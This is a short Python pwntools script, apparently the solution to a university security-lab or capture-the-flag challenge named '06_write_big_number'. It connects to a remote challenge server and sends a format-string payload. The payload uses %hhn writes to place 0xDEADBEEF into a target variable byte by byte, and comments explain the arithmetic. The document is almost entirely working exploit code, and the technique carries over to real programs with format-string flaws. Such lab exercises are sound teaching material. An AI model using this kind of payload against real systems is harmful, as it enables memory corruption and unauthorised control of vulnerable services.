from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25196

PROG_NAME = "06_write_big_number"

elf = ELF(PROG_NAME)
target_address = elf.symbols["target"]
print("Target address: ", target_address)

s = remote(SERVER, PORT)

payload = p32(target_address)  # 4 0xEF
payload += p32(target_address + 1)  # 8 0xBE
payload += p32(target_address + 2)  # 12  0xAD
payload += p32(target_address + 3)  # 16 0xDE

# 0xDEADBEEF
# EF BE AD DE (little endian)
payload += b"%223x%7$hhn"  # 0xEF
# 223 + 16 = 239 = EF
payload += b"%207x%8$hhn"  # 0xBE
# 239 + 207 = 446 mod 256 = 190 = BE
payload += b"%239x%9$hhn"  # 0xAD
# 190 + 239 = 685 mod 256 = 173 = AD
payload += b"%49x%10$hhn"  # 0xDE
# 173 + 49 = 222 = DE

# mod 256 do %hnn
s.sendline(payload)
print(s.recv())
